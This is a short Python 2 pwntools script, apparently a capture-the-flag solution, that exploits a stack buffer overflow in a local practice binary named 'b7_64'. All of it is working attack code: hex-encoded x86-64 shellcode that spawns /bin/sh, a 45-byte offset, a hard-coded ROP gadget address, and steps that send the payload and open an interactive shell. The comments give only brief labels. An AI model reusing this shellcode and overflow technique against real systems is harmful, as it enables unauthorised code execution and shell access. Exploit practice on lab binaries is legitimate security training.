#Import pwntools
from pwn import *

#Start the binary
target = process('./b7_64')

#Print the text from the binary to reach fgets
print target.recvline();

#Create the offset
offset = "0"*45

#Declare the shellcode
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#Declare the ROP Gadget
gadget = p64(0x000000000040063e)

#Construct the payload
payload = shellcode + offset + gadget

#Let's write the payload to a file, for gdb troubleshooting
p = open("in", "w")
p.write(payload)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
